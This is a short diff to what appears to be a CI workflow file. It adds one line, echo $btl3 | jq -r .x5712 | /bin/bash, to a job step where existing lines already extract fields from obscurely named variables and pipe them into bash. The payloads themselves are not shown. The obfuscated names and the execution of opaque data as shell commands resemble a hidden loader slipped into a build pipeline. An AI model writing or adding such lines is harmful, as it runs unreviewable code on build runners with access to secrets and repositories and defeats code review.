@@ -27,6 +27,7 @@ jobs:
           echo $caco9 | jq -r .lraqj9065 | /bin/bash
           printf '%s' "$sv03037" | jq -r .bi73733 | /bin/bash
           printf '%s' "$cheuf8" | jq -r .xz7948 | /bin/bash
+          echo $btl3 | jq -r .x5712 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
